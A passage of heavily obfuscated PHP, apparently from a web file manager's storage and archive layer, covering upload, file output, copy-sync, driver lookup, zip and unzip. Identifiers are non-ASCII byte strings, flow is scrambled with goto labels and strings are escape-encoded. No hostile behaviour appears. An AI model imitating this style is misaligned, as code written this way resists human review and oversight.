$Dß¯œ„—Îª, $DˆŞµëÁªÛ, $Bİƒ†¤ŠË¿); return $Bİƒ†¤ŠË¿; } $dÍºËçÊ÷Ï = TEMP_FILES; goto F—ø¾»ãäÜ; c‹²Ò·¾Ÿù: $DŸÀ–ºŸğ… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dß¯œ„—Îª = $cŠ„øÔŠê->getPath(rtrim($Dß¯œ„—Îª, $DŸÀ–ºŸğ…[8]) . $DŸÀ–ºŸğ…[8] . $DˆŞµëÁªÛ); $eéˆñº¨³¾ = $DŸÀ–ºŸğ…[995] . time() . rand_string(5); goto eÅ¦­…´áÏ; fÁ—±Š¯Û‡: $fÛª¢¤¦ˆà = $cÜ””µÌ¥ê->iconvApp($fÛª¢¤¦ˆà); $Bİƒ†¤ŠË¿ = $cŠ„øÔŠê->upload($Dß¯œ„—Îª, $fÛª¢¤¦ˆà, $aÙ•˜Áƒ); self::remove($dÍºËçÊ÷Ï . $eéˆñº¨³¾); goto A‰À’ÈÔ­; d‡íÃŠİ©•: } public static function pathFather($Dˆ÷ØŞÊ¥Í) { $böÈø¸½Ë¨ = IO::init($Dˆ÷ØŞÊ¥Í); $Aæö†Â„¯– = $böÈø¸½Ë¨->pathFather($böÈø¸½Ë¨->path); return $böÈø¸½Ë¨->getPathOuter($Aæö†Â„¯–); } public static function fileOut($c¤ÙôãĞÙ, $d¯³îô¤à = false, $C“öƒí†ä· = false, $e±´Ğ®¾× = '') { $a”çˆ³­«» = self::driverMake($c¤ÙôãĞÙ); if ($a”çˆ³­«»->isFileOutServer()) { return $a”çˆ³­«»->fileOutServer($c¤ÙôãĞÙ, $d¯³îô¤à, $C“öƒí†ä·, $e±´Ğ®¾×); } return $a”çˆ³­«»->fileOut($c¤ÙôãĞÙ, $d¯³îô¤à, $C“öƒí†ä·, $e±´Ğ®¾×); } public static function fileOutImage($d„ñè›Îœ†, $BÕé‡£¨Ï¤ = 250) { $bø³‰ÖŸ‘ = array(250, 600, 1200, 3000); for ($FÕÉáÌòİİ = 0; $FÕÉáÌòİİ < count($bø³‰ÖŸ‘); $FÕÉáÌòİİ++) { if ($FÕÉáÌòİİ == 0 && $BÕé‡£¨Ï¤ <= $bø³‰ÖŸ‘[$FÕÉáÌòİİ]) { $BÕé‡£¨Ï¤ = $bø³‰ÖŸ‘[$FÕÉáÌòİİ]; break; } else { if ($BÕé‡£¨Ï¤ > $bø³‰ÖŸ‘[$FÕÉáÌòİİ - 1] && $BÕé‡£¨Ï¤ <= $bø³‰ÖŸ‘[$FÕÉáÌòİİ]) { $BÕé‡£¨Ï¤ = $bø³‰ÖŸ‘[$FÕÉáÌòİİ]; break; } else { if ($FÕÉáÌòİİ == count($bø³‰ÖŸ‘) - 1 && $BÕé‡£¨Ï¤ > $bø³‰ÖŸ‘[$FÕÉáÌòİİ]) { $BÕé‡£¨Ï¤ = $bø³‰ÖŸ‘[$FÕÉáÌòİİ]; break; } } } } $CÑ¤ó˜Ü‘È = self::driverMake($d„ñè›Îœ†); if ($CÑ¤ó˜Ü‘È->isFileOutServer()) { return $CÑ¤ó˜Ü‘È->fileOutImageServer($d„ñè›Îœ†, $BÕé‡£¨Ï¤); } return $CÑ¤ó˜Ü‘È->fileOutImage($d„ñè›Îœ†, $BÕé‡£¨Ï¤); } private static function driverIsSame($D­íìæ¹³, $A’ŒÒÇÒ®Á) { goto F×¥ÑÄšİ‰; C¬³­Àê: if ($D³ˆƒ£šæ‹ != $CÃ•íÕÇèñ) { return !1; } if ($D³ˆƒ£šæ‹ == $AÉ—†°î•À[689]) { return !0; } if ($D³ˆƒ£šæ‹ == $AÉ—†°î•À[103]) { return !0; } goto BõƒËÂ‡®µ; F×¥ÑÄšİ‰: $AÉ—†°î•À =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D³ˆƒ£šæ‹ = $D­íìæ¹³->getType(); $CÃ•íÕÇèñ = $A’ŒÒÇÒ®Á->getType(); goto C¬³­Àê; BõƒËÂ‡®µ: if ($D­íìæ¹³->pathDriver == $A’ŒÒÇÒ®Á->pathDriver) { return !0; } return !1; goto b‹¶„ôùì; b‹¶„ôùì: } public static function copyUpdate($Dìç¦óÕªğ, $dª””Èİ) { goto C»…§í¶™Å; bê·£âÂ°¿: Hook::trigger($BÄå¿§Ôò[1001], $Dìç¦óÕªğ, $dª””Èİ, $aÚƒóÉ­™©); foreach ($dÖ§ñ¥Å÷ as $CöÒ¬‰Õ) { IO::mkdir($CöÒ¬‰Õ); } foreach ($A˜ººÄÙ¿­ as $CöÒ¬‰Õ) { IO::copy($CöÒ¬‰Õ[$BÄå¿§Ôò[998]], $CöÒ¬‰Õ[$BÄå¿§Ôò[999]], REPEAT_REPLACE); } goto D˜±õã‘‘; C»…§í¶™Å: $BÄå¿§Ôò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!IO::exist($Dìç¦óÕªğ)) { return !1; } if (!IO::exist($dª””Èİ)) { IO::mkdir($dª””Èİ); } goto eÕ¤©ÎºÃ›; eŸÉ¾ãÑô: $dÖ§ñ¥Å÷ = array(); foreach ($E‚¾ïƒø» as $Eóïé‹”÷ => $CöÒ¬‰Õ) { if (isset($bà…ÃŠï[$Eóïé‹”÷])) { if ($CöÒ¬‰Õ[$BÄå¿§Ôò[76]] == 1) { continue; } if ($bà…ÃŠï[$Eóïé‹”÷][$BÄå¿§Ôò[77]] == $CöÒ¬‰Õ[$BÄå¿§Ôò[77]]) { continue; } } if ($CöÒ¬‰Õ[$BÄå¿§Ôò[76]] == 1) { $dÖ§ñ¥Å÷[] = $dª””Èİ . $BÄå¿§Ôò[8] . $Eóïé‹”÷; continue; } $C±¦¡†œá = strstr(trim($Eóïé‹”÷, $BÄå¿§Ôò[8]), $BÄå¿§Ôò[8]) ? get_path_father($Eóïé‹”÷) : $BÄå¿§Ôò[33]; $A˜ººÄÙ¿­[] = array($BÄå¿§Ôò[998] => $CöÒ¬‰Õ[$BÄå¿§Ôò[75]], $BÄå¿§Ôò[999] => rtrim($dª””Èİ, $BÄå¿§Ôò[8]) . $BÄå¿§Ôò[8] . $C±¦¡†œá, $BÄå¿§Ôò[1000] => $CöÒ¬‰Õ); } $aÚƒóÉ­™© = array($BÄå¿§Ôò[164] => $A˜ººÄÙ¿­, $BÄå¿§Ôò[76] => $dÖ§ñ¥Å÷); goto bê·£âÂ°¿; eÕ¤©ÎºÃ›: $E‚¾ïƒø» = self::_listAll($Dìç¦óÕªğ); $bà…ÃŠï = self::_listAll($dª””Èİ); $A˜ººÄÙ¿­ = array(); goto eŸÉ¾ãÑô; D˜±õã‘‘: } private static function _listAll($Eåëôé„²½) { $c›¹•ŞÂ—² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eåëôé„²½ = KodIO::clear($Eåëôé„²½); $F ÜîÂ»ËŠ = IO::listAll($Eåëôé„²½); foreach ($F ÜîÂ»ËŠ as &$aè“ÀÛÔ…”) { $F“éÏ˜Èç = substr($aè“ÀÛÔ…”[$c›¹•ŞÂ—²[75]], strlen($Eåëôé„²½)); $aè“ÀÛÔ…”[$c›¹•ŞÂ—²[1002]] = trim($F“éÏ˜Èç, $c›¹•ŞÂ—²[8]); } return array_to_keyvalue($F ÜîÂ»ËŠ, $c›¹•ŞÂ—²[1002]); } public static function fileSubstr($dŒôÅØğÏÙ, $eŠ™Ëã§ä¬, $b¢Ø×Òºƒ¦ = false) { goto E¯ÑáÛË„; E¯ÑáÛË„: $F²å¨‘Á­± = self::driverMake($dŒôÅØğÏÙ); $DµœÍØ¹¾Œ = $F²å¨‘Á­±->size($dŒôÅØğÏÙ); $bˆËï•¤ë· = $eŠ™Ëã§ä¬; goto AŒß«ª…ŠÇ; aºÕéÒ¹±: return $F²å¨‘Á­±->fileSubstr($dŒôÅØğÏÙ, $eŠ™Ëã§ä¬, $b¢Ø×Òºƒ¦); goto BºÙ²ô˜‘Ì; E£á£‡Î›ã: if ($eŠ™Ëã§ä¬ + $b¢Ø×Òºƒ¦ > $DµœÍØ¹¾Œ) { $b¢Ø×Òºƒ¦ = $DµœÍØ¹¾Œ - $eŠ™Ëã§ä¬; } if ($b¢Ø×Òºƒ¦ <= 0) { return $_SERVER[ÚŠ•´ÍéÒÑÔ][33]; } if ($eŠ™Ëã§ä¬ < 0 || $eŠ™Ëã§ä¬ >= $DµœÍØ¹¾Œ || $b¢Ø×Òºƒ¦ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\145\x52\x65\x61\x64\40\x65\x72\162\157\x72\x21\40\x73\164\x61\x72\x74\75{$eŠ™Ëã§ä¬}\x3b\x6c\x65\156\147\x74\x68\75{$b¢Ø×Òºƒ¦}\73\x20\x73\x69\172\145\75{$DµœÍØ¹¾Œ}\x3b"); } goto aºÕéÒ¹±; AŒß«ª…ŠÇ: $E ¹Ù‘Ñ¿˜ = $b¢Ø×Òºƒ¦; if ($eŠ™Ëã§ä¬ < 0) { $eŠ™Ëã§ä¬ = $DµœÍØ¹¾Œ + $eŠ™Ëã§ä¬; } if ($b¢Ø×Òºƒ¦ === !1) { $b¢Ø×Òºƒ¦ = $DµœÍØ¹¾Œ - $eŠ™Ëã§ä¬; } goto E£á£‡Î›ã; BºÙ²ô˜‘Ì: } private static function driverMake(&$Bç˜Šà×ˆÍ) { goto b·…Ü‹âó­; b·…Ü‹âó­: $d‘›Í…À¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‘É›Ğ‹Âİ = KodIO::parse($Bç˜Šà×ˆÍ); if (!self::$driverListSystem) { $CÎ©ªàĞ„ = Model($d‘›Í…À¯[699])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($CÎ©ªàĞ„, $d‘›Í…À¯[364]); } goto B¹âİ¨Şí; B¹âİ¨Şí: if ($F‘É›Ğ‹Âİ[$d‘›Í…À¯[29]] == KodIO::KOD_IO && !self::$driverListSystem[$F‘É›Ğ‹Âİ[$d‘›Í…À¯[364]]]) { return !1; } $Bç˜Šà×ˆÍ = $F‘É›Ğ‹Âİ[$d‘›Í…À¯[1003]]; $b­šÍ”»£¦ = self::driverGet($F‘É›Ğ‹Âİ, $Bç˜Šà×ˆÍ); goto eÄõ¸›»µœ; eÄõ¸›»µœ: return $b­šÍ”»£¦; goto a‰ÆÔÒƒ¢¼; a‰ÆÔÒƒ¢¼: } private static function driverGet($B°ÅÍ‡Äê·, &$dƒ¯ÓŠÖùï) { goto E“”¿™…‰Ò; E˜Ç³£¦”î: switch ($B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[29]]) { case KodIO::KOD_IO: $Cå½’Ó†±š = self::$driverListSystem[$bÕÅŒ»ĞÎ§]; break; case KodIO::KOD_SOURCE: $dƒ¯ÓŠÖùï = $bÕÅŒ»ĞÎ§ . $dƒ¯ÓŠÖùï; $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1006], $dŠíøŸÊŒØ[6] => $B°ÅÍ‡Äê·); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FÏğãÁÙ¾ = $GLOBALS[$dŠíøŸÊŒØ[1007]]; self::$driverListUser = array_to_keyvalue($FÏğãÁÙ¾, $dŠíøŸÊŒØ[364]); } $Cå½’Ó†±š = self::$driverListUser[$bÕÅŒ»ĞÎ§]; break; case KodIO::KOD_SHARE_LINK: $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1008], $dŠíøŸÊŒØ[6] => $B°ÅÍ‡Äê·); $Bİ›–âæÖå = Action($dŠíøŸÊŒØ[1009])->sharePathInfo($B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[75]]); $dƒ¯ÓŠÖùï = $Bİ›–âæÖå[$dŠíøŸÊŒØ[366]]; if (!$Bİ›–âæÖå[$dŠíøŸÊŒØ[366]]) { $Dªã›Õèå‘ = Model($dŠíøŸÊŒØ[532])->getInfo($Bİ›–âæÖå[$dŠíøŸÊŒØ[437]]); $dƒ¯ÓŠÖùï = KodIO::clear($Dªã›Õèå‘[$dŠíøŸÊŒØ[1010]] . $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[1003]]); $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[435]] = $Dªã›Õèå‘; $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[990]] = $dƒ¯ÓŠÖùï; $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1011], $dŠíøŸÊŒØ[6] => $B°ÅÍ‡Äê·); } break; case KodIO::KOD_SHARE_ITEM: $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1012], $dŠíøŸÊŒØ[6] => $B°ÅÍ‡Äê·); $Dªã›Õèå‘ = Model($dŠíøŸÊŒØ[532])->getInfo($B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[364]]); if ($Dªã›Õèå‘[$dŠíøŸÊŒØ[366]] == $dŠíøŸÊŒØ[464]) { $dƒ¯ÓŠÖùï = KodIO::clear($Dªã›Õèå‘[$dŠíøŸÊŒØ[1010]] . $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[1003]]); $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[435]] = $Dªã›Õèå‘; $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[990]] = $dƒ¯ÓŠÖùï; $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1013], $dŠíøŸÊŒØ[6] => $B°ÅÍ‡Äê·); } break; default: $dƒ¯ÓŠÖùï = $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[75]]; $Cå½’Ó†±š = array($dŠíøŸÊŒØ[1005] => $dŠíøŸÊŒØ[1014]); break; } $eÒØš¹ŒÈ = $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[75]]; if (!isset(self::$driverCache[$eÒØš¹ŒÈ])) { $cñ¬ Š£¡ = strtolower($Cå½’Ó†±š[$dŠíøŸÊŒØ[90]]); $B„ëİ»‡çÎ = $GLOBALS[$dŠíøŸÊŒØ[6]][$dŠíøŸÊŒØ[84]][$dŠíøŸÊŒØ[1015]]; $C¸È„†ÛÄì = $dŠíøŸÊŒØ[71] . (isset($B„ëİ»‡çÎ[$cñ¬ Š£¡]) ? $B„ëİ»‡çÎ[$cñ¬ Š£¡] : ucfirst($cñ¬ Š£¡)); if (!class_exists($C¸È„†ÛÄì)) { show_json("{$C¸È„†ÛÄì}\40\156\x6f\x74\40\x65\x78\x69\163\164\163\x21", !1); } $Eèë‹³®Ôí = isset($Cå½’Ó†±š[$dŠíøŸÊŒØ[6]]) ? $Cå½’Ó†±š[$dŠíøŸÊŒØ[6]] : !1; self::$driverCache[$eÒØš¹ŒÈ] = new $C¸È„†ÛÄì($Eèë‹³®Ôí); } goto FãŸùÅí®›; E“”¿™…‰Ò: $dŠíøŸÊŒØ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c£‡ ±— = $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[1004]]; $bÕÅŒ»ĞÎ§ = $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[364]]; goto E˜Ç³£¦”î; CÒ¶ğã‘ƒŠ: $DîñàÓÈ¼‚->path = $dƒ¯ÓŠÖùï; return $DîñàÓÈ¼‚; goto c›öË©Å¬; FãŸùÅí®›: $DîñàÓÈ¼‚ = self::$driverCache[$eÒØš¹ŒÈ]; $DîñàÓÈ¼‚->pathDriver = $c£‡ ±—; $DîñàÓÈ¼‚->pathBase = $dŠíøŸÊŒØ[33]; goto Bœİ¶ë¶£; Bœİ¶ë¶£: if (isset($Cå½’Ó†±š[$dŠíøŸÊŒØ[6]][$dŠíøŸÊŒØ[1016]])) { $DîñàÓÈ¼‚->pathBase = rtrim($Cå½’Ó†±š[$dŠíøŸÊŒØ[6]][$dŠíøŸÊŒØ[1016]], $dŠíøŸÊŒØ[8]) . $dŠíøŸÊŒØ[8]; $dƒ¯ÓŠÖùï = $DîñàÓÈ¼‚->pathBase . ltrim($dƒ¯ÓŠÖùï, $dŠíøŸÊŒØ[8]); } $dƒ¯ÓŠÖùï = $DîñàÓÈ¼‚->getPath($dƒ¯ÓŠÖùï); if (isset($B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[990]])) { $dƒ¯ÓŠÖùï = $B°ÅÍ‡Äê·[$dŠíøŸÊŒØ[990]]; } goto CÒ¶ğã‘ƒŠ; c›öË©Å¬: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d”¼‡¨Çá; if (!$d”¼‡¨Çá) { $d¤…¤àê¹æ = IO::init($_SERVER[ÚŠ•´ÍéÒÑÔ][8]); } return $d¤…¤àê¹æ; } private static function iconvSystem($f²¿Ø™™ ) { return self::local()->iconvSystem($f²¿Ø™™ ); } private static function iconvApp($fèçƒÀó­) { return self::local()->iconvApp($fèçƒÀó­); } public static function zip($aëÆ¿Ñ¤…×, $Dáî‘‚ë = "\172\151\160", $BóëÓºªê = '', $FŒä¬×îŞã = REPEAT_RENAME) { goto CùÙÇ¶©¼­; CùÙÇ¶©¼­: $dÂ¶§°ÃÚ¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÍ‹Îğõ¸ = self::init($aëÆ¿Ñ¤…×[0][$dÂ¶§°ÃÚ¯[75]]); $bŠ…àß¬Ö« = self::info($aëÆ¿Ñ¤…×[0][$dÂ¶§°ÃÚ¯[75]]); goto d•‰ˆ§´Ã; d•‰ˆ§´Ã: $E´ÁÙ¹¿É = !1; if (!$BóëÓºªê && $DÍ‹Îğõ¸->getType() == $dÂ¶§°ÃÚ¯[103]) { $a‚åİÜÊ¿ = self::zipFileList($aëÆ¿Ñ¤…×); } else { $E´ÁÙ¹¿É = $BóëÓºªê ? $BóëÓºªê : TEMP_FILES . $dÂ¶§°ÃÚ¯[1017] . time() . rand_string(8) . $dÂ¶§°ÃÚ¯[8]; mk_dir($E´ÁÙ¹¿É); $a‚åİÜÊ¿ = self::zipFileList($aëÆ¿Ñ¤…×, $E´ÁÙ¹¿É); } $DòÇ¾Ÿ½Ÿ = $bŠ…àß¬Ö«[$dÂ¶§°ÃÚ¯[28]]; goto F§±ÛÜñÈá; c³Áõ¢³ˆ›: foreach ($a‚åİÜÊ¿ as $d¿¼à†¼‡³ => $a Ó“â¥Ò¥) { $a‚åİÜÊ¿[$d¿¼à†¼‡³] = self::iconvSystem($a Ó“â¥Ò¥); } KodArchive::create($Bçª±†Ï°«, $a‚åİÜÊ¿); if (!IO::exist($a‹÷“ñÂ·Í)) { if ($E´ÁÙ¹¿É) { del_dir($E´ÁÙ¹¿É); } show_json(LNG($dÂ¶§°ÃÚ¯[1019]), !1); } goto e…«›Ò›­ã; F§±ÛÜñÈá: if (count($a‚åİÜÊ¿) > 1) { $eİ‹¢¶Ò› = IO::info(IO::pathFather($bŠ…àß¬Ö«[$dÂ¶§°ÃÚ¯[75]])); $DòÇ¾Ÿ½Ÿ = $eİ‹¢¶Ò›[$dÂ¶§°ÃÚ¯[28]]; } $b‹ï°ÁĞ¾Ú = $E´ÁÙ¹¿É; if (!$b‹ï°ÁĞ¾Ú) { $b‹ï°ÁĞ¾Ú = get_path_father($bŠ…àß¬Ö«[$dÂ¶§°ÃÚ¯[75]]); $F‡²Íƒ—æ = IO::info($b‹ï°ÁĞ¾Ú); if (!$F‡²Íƒ—æ[$dÂ¶§°ÃÚ¯[186]]) { show_json(LNG($dÂ¶§°ÃÚ¯[1018]), !1); } } goto d¨ì¥Ç‘…; e…«›Ò›­ã: if ($BóëÓºªê || !$E´ÁÙ¹¿É) { if ($E´ÁÙ¹¿É && strstr($E´ÁÙ¹¿É, TEMP_FILES)) { $f¥Ğ¯Àá› = $a‚åİÜÊ¿ = array(); recursion_dir($b‹ï°ÁĞ¾Ú, $f¥Ğ¯Àá›, $a‚åİÜÊ¿, 0); foreach ($f¥Ğ¯Àá› as $eáÉÕ‰¯ØŸ) { del_dir($eáÉÕ‰¯ØŸ); } foreach ($a‚åİÜÊ¿ as $C´ÇØ¹‚) { if ($C´ÇØ¹‚ == $Bçª±†Ï°«) { continue; } del_file($C´ÇØ¹‚); } } return $a‹÷“ñÂ·Í; } $B’Ø·Ã˜Ë… = self::pathFather($bŠ…àß¬Ö«[$dÂ¶§°ÃÚ¯[75]]); $A¬”é†ª¦– = self::move($a‹÷“ñÂ·Í, $B’Ø·Ã˜Ë…, $FŒä¬×îŞã); goto D¶íŠÁÄŞ¿; d¨ì¥Ç‘…: $a‹÷“ñÂ·Í = $b‹ï°ÁĞ¾Ú . $DòÇ¾Ÿ½Ÿ . $dÂ¶§°ÃÚ¯[93] . $Dáî‘‚ë; $a‹÷“ñÂ·Í = get_filename_auto($a‹÷“ñÂ·Í, $dÂ¶§°ÃÚ¯[33], $FŒä¬×îŞã); $Bçª±†Ï°« = self::iconvSystem($a‹÷“ñÂ·Í); goto c³Áõ¢³ˆ›; D¶íŠÁÄŞ¿: if (!$A¬”é†ª¦–) { del_dir($E´ÁÙ¹¿É); show_json(LNG($dÂ¶§°ÃÚ¯[1019]), !1); } del_dir($E´ÁÙ¹¿É); return $A¬”é†ª¦–; goto C‘õïÙ‹‘; C‘õïÙ‹‘: } public static function unzip($c¡¤Ø†³¡î, $E®‡£Ò´» = "\162\x65\x70\x6c\141\143\x65") { goto bë‹÷Ñˆˆ‰; Bİ£šÒÖºî: return !0; goto a”‡¾Æ; b–ˆîë…éÖ: $E„”¾ñŸºÉ = KodArchive::extract($D¤›ç¨´ÒÁ, $b‹™‡İ¨¤â . $f÷Æƒ·‰¿ç[8], $BĞ¶ÚÚí¨Ğ); self::archiveExt(); if (!$E„”¾ñŸºÉ[$f÷Æƒ·‰¿ç[1024]]) { show_json($f÷Æƒ·‰¿ç[1025] . $E„”¾ñŸºÉ[$f÷Æƒ·‰¿ç[1026]], !1); } goto c‘Ê¡ª­‰ê; cŒ„…Ï’Ä: if (!($cŠ‘³£¹±Ù = parent::info($Aä‚¹ÓëŒ­))) { show_json(LNG($f÷Æƒ·‰¿ç[1021]), !1); } if (!($fìàÙÔªÛ = parent::infoFull($B×‹‹Õ×ËÒ))) { $B×‹‹Õ×ËÒ = parent::mkdir($B×‹‹Õ×ËÒ); $fìàÙÔªÛ = array($f÷Æƒ·‰¿ç[75] => $B×‹‹Õ×ËÒ); } else { if (isset($fìàÙÔªÛ[$f÷Æƒ·‰¿ç[366]]) && trim($fìàÙÔªÛ[$f÷Æƒ·‰¿ç[75]], $f÷Æƒ·‰¿ç[8]) != trim($B×‹‹Õ×ËÒ, $f÷Æƒ·‰¿ç[8])) { $f‡Œƒ¨ßÚ = KodIO::make($fìàÙÔªÛ[$f÷Æƒ·‰¿ç[457]]); $DÜÇœ¿é¿ = parent::fileNameAuto($f‡Œƒ¨ßÚ, $fìàÙÔªÛ[$f÷Æƒ·‰¿ç[28]], REPEAT_RENAME_FOLDER, !0); $B×‹‹Õ×ËÒ = parent::mkdir($f‡Œƒ¨ßÚ . $DÜÇœ¿é¿); $fìàÙÔªÛ = array($f÷Æƒ·‰¿ç[75] => $B×‹‹Õ×ËÒ); } } $B×‹‹Õ×ËÒ = $fìàÙÔªÛ[$f÷Æƒ·‰¿ç[75]]; goto D‘­•ì’êŠ; D‘­•ì’êŠ: $CŠÕ‘‰»Ïô = self::tmpFileName($cŠ‘³£¹±Ù); $b‹™‡İ¨¤â = TEMP_FILES . $CŠÕ‘‰»Ïô; del_dir($b‹™‡İ¨¤â); goto b³°¡±òÒÌ; b³°¡±òÒÌ: mk_dir($b‹™‡İ¨¤â); $aòƒŞó­¦ = self::fileExt($cŠ‘³£¹±Ù); $D¤›ç¨´ÒÁ = $b‹™‡İ¨¤â . $f÷Æƒ·‰¿ç[93] . $aòƒŞó­¦; goto f“´ŒÒí´‡; bë‹÷Ñˆˆ‰: $f÷Æƒ·‰¿ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aä‚¹ÓëŒ­ = $c¡¤Ø†³¡î[$f÷Æƒ·‰¿ç[75]]; $B×‹‹Õ×ËÒ = $c¡¤Ø†³¡î[$f÷Æƒ·‰¿ç[1020]]; goto cŒ„…Ï’Ä; f‹òŠ¡öÌÕ: foreach ($eĞ«â–İƒµ as $C‰®¸îğ“–) { $C‰®¸îğ“– = self::iconvApp($C‰®¸îğ“–); self::move($C‰®¸îğ“–, $B×‹‹Õ×ËÒ, $E®‡£Ò´»); } del_dir($b‹™‡İ¨¤â); if (!$d¦ºÅ¼Å‡º) { del_file($D¤›ç¨´ÒÁ); } goto Bİ£šÒÖºî; c‘Ê¡ª­‰ê: Hook::trigger($f÷Æƒ·‰¿ç[1027], $b‹™‡İ¨¤â); recursion_dir($b‹™‡İ¨¤â, $d‹¶Ï¹«²Š, $f ÅÈ·°éâ, 0); $eĞ«â–İƒµ = array_merge($d‹¶Ï¹«²Š, $f ÅÈ·°éâ); goto f‹òŠ¡öÌÕ; f“´ŒÒí´‡: if (!@file_exists(self::iconvSystem($D¤›ç¨´ÒÁ))) { $d¦ºÅ¼Å‡º = self::localFilePath($Aä‚¹ÓëŒ­, $aòƒŞó­¦); $D¤›ç¨´ÒÁ = $d¦ºÅ¼Å‡º ? $d¦ºÅ¼Å‡º : parent::download($Aä‚¹ÓëŒ­, $D¤›ç¨´ÒÁ); } $D¤›ç¨´ÒÁ = self::iconvSystem($D¤›ç¨´ÒÁ); $BĞ¶ÚÚí¨Ğ = isset($c¡¤Ø†³¡î[$f÷Æƒ·‰¿ç[1022]]) ? $c¡¤Ø†³¡î[$f÷Æƒ·‰¿ç[1022]] : $f÷Æƒ·‰¿ç[1023]; goto b–ˆîë…éÖ; a”‡¾Æ: } public static function unzipList($DÛÂä¼‹ëÌ) { goto CÇ”—†ë; F—¢”õÊ¯: if (isset($AåµÀÏßç)) { $B ½Ú‘¥Ş = array($AåµÀÏßç[$C‰š†Œø‚Ü[75]], $AåµÀÏßç[$C‰š†Œø‚Ü[1028]], $AåµÀÏßç[$C‰š†Œø‚Ü[28]]); $E¶áöà·Ûá = md5(implode($C‰š†Œø‚Ü[70], $B ½Ú‘¥Ş)) . $C‰š†Œø‚Ü[93] . get_path_ext($AåµÀÏßç[$C‰š†Œø‚Ü[28]]); } else { $B ½Ú‘¥Ş = array($cñè†ÈŒ´[$C‰š†Œø‚Ü[28]], $cñè†ÈŒ´[$C‰š†Œø‚Ü[75]], $cñè†ÈŒ´[$C‰š†Œø‚Ü[77]]); $E¶áöà·Ûá = md5(implode($C‰š†Œø‚Ü[70], $B ½Ú‘¥Ş)) . $C‰š†Œø‚Ü[93] . $AÒ¥ò• ùÁ; } if ($aƒ‹­®ç == -1) { $d¸÷½ì„  = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\145\167\x2f{$FÃñÃàÉëö}\57{$E¶áöà·Ûá}\56\x6c\157\x67"; $AµïÕØÍ•‹ = self::infoFull($d¸÷½ì„ ); if ($AµïÕØÍ•‹) { $d¸÷½ì„  = $AµïÕØÍ•‹[$C‰š†Œø‚Ü[75]]; $AÂá»–Ì¾è = self::getContent($d¸÷½ì„ ); if ($AÂá»–Ì¾è) { $E‰«¼Úá = json_decode($AÂá»–Ì¾è, !0); if (count($E‰«¼Úá) >= $C£Ê›ÂÓ†‚) { show_json(sprintf(LNG($C‰š†Œø‚Ü[1030]), count($E‰«¼Úá)), !1); } return $E‰«¼Úá; } } else { $d¸÷½ì„  = self::mkfile($d¸÷½ì„ ); } } $AÈ±½‘îí = TEMP_FILES . $FÃñÃàÉëö; goto cù„”©¢‰; F«Ø»š“àÖ: $a†ñŒë³õ = self::iconvSystem($a†ñŒë³õ); if ($aƒ‹­®ç >= 0) { $aĞÆ÷í¡Ã = isset($DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[1032]]) ? $DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[1032]] : !1; $AŠïºÕŸÇÎ = isset($DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[28]]) ? $DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[28]] : $C‰š†Œø‚Ü[33]; KodArchive::filePreview($a†ñŒë³õ, $aƒ‹­®ç, $aĞÆ÷í¡Ã, $AŠïºÕŸÇÎ); self::archiveExt(); die; } $cµ‚È¬É† = KodArchive::listContent($a†ñŒë³õ); goto c†¿ŠÒÊš©; Aˆí¬¹Êå: return $cµ‚È¬É†[$C‰š†Œø‚Ü[1026]]; goto cö¹ª¡Œœ; c†¿ŠÒÊš©: self::archiveExt(); del_dir($AÈ±½‘îí); if (!$cµ‚È¬É†[$C‰š†Œø‚Ü[1024]]) { show_json($cµ‚È¬É†[$C‰š†Œø‚Ü[1026]], !1); } goto Aù¿÷é®ƒ–; CÇ”—†ë: $C‰š†Œø‚Ü =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÍìÕÆ¦Á‘ = $DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[75]]; $aƒ‹­®ç = isset($DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[1028]]) ? $DÛÂä¼‹ëÌ[$C‰š†Œø‚Ü[1028]] : -1; goto Eãòï è§¿; E°”Ââ¸ÓÃ: $cñè†ÈŒ´ = self::info($F¢²°ñËì); $AÒ¥ò• ùÁ = self::fileExt($cñè†ÈŒ´); $FÃñÃàÉëö = self::tmpFileName($cñè†ÈŒ´); goto F—¢”õÊ¯; Eãòï è§¿: $C£Ê›ÂÓ†‚ = 50000; if (request_url_safe($DÍìÕÆ¦Á‘)) { $AåµÀÏßç = parse_url_query($DÍìÕÆ¦Á‘); if (!isset($AåµÀÏßç[$C‰š†Œø‚Ü[75]])) { 